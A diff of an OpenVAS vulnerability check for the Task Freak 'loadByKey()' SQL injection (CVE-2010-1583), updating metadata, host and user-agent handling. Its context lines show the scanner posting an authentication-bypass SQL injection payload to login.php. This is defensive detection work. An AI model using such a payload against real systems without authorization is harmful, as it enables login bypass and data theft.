@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_task_freak_sql_inj_vuln.nasl 5401 2017-02-23 09:46:07Z teissa $
+# $Id: secpod_task_freak_sql_inj_vuln.nasl 5838 2017-04-03 10:26:36Z cfi $
 #
 # Task Freak 'loadByKey()' SQL Injection Vulnerability
 #
@@ -39,8 +39,8 @@ tag_summary = "This host is running Task Freak and is prone SQL Injection
 if(description)
 {
   script_id(902052);
-  script_version("$Revision: 5401 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-02-23 10:46:07 +0100 (Thu, 23 Feb 2017) $");
+  script_version("$Revision: 5838 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-04-03 12:26:36 +0200 (Mon, 03 Apr 2017) $");
   script_tag(name:"creation_date", value:"2010-05-25 13:56:16 +0200 (Tue, 25 May 2010)");
   script_cve_id("CVE-2010-1583");
   script_bugtraq_id(39793);
@@ -57,6 +57,8 @@ if(description)
   script_family("Web application abuses");
   script_dependencies("secpod_task_freak_detect.nasl");
   script_require_ports("Services/www", 80);
+  script_mandatory_keys("TaskFreak/installed");
+
   script_tag(name : "insight" , value : tag_insight);
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
@@ -64,18 +66,13 @@ if(description)
   script_tag(name : "affected" , value : tag_affected);
   exit(0);
 }
-		
 
 include("http_func.inc");
 include("version_func.inc");
 include("http_keepalive.inc");
 
 tfPort = get_http_port(default:80);
-if(!get_port_state(tfPort)){
-  exit(0);
-}
 
-## Get Task Freak version from KB
 tfVer = get_kb_item("www/"+ tfPort + "/TaskFreak");
 if(!tfVer){
   exit(0);
@@ -86,13 +83,13 @@ if(tfVer[2] != NULL)
 {
   ## Try an exploit
   filename = string(tfVer[2] + "/login.php");
-  host = get_host_name();
+  host = http_host_name( port:tfPort );
   authVariables ="username=+%221%27+or+1%3D%271%22++";
 
   ## Construct post request
   sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
-                   "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.4) Gecko/2008111217 Fedora/3.0.4-1.fc10 Firefox/3.0.4\r\n",
+                   "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                    "Accept-Language: en-us,en;q=0.5\r\n",
                    "Keep-Alive: 300\r\n",
